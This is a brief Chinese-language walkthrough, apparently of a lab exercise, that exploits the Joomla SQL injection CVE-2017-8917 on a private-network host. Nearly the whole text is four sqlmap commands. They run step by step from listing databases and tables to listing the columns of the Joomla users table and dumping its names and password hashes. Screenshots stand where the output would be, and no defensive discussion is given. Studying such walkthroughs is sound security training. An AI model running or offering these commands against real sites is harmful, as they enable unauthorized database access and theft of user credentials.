## 爆破下目录

## CVE-2017-8917 SQL注入

```
sqlmap -u "http://192.168.152.247/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml"  --dbs --batch
```

![](../Images/103b80ebbe2397b21f48b707d9afdaf4.png)

爆出表  

```
sqlmap -u "http://192.168.152.247/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml"  -D joomladb --tables --batch
```

![](../Images/d41b4ea6fb1a65cd96d7a27659a1bac2.png)

爆出字段  

```
sqlmap -u "http://192.168.152.247/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#\_\_users" --columns  -p list\[fullordering\]
```

![](../Images/4423410646e3679c6fbdd36a3170c406.png)

爆出值  

```
sqlmap -u "http://192.168.152.247/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#\_\_users" -C name,password --dump  -p list\[fullordering\]
```

![](../Images/7722efe0eae6526626eac447fb5eb3ba.png)
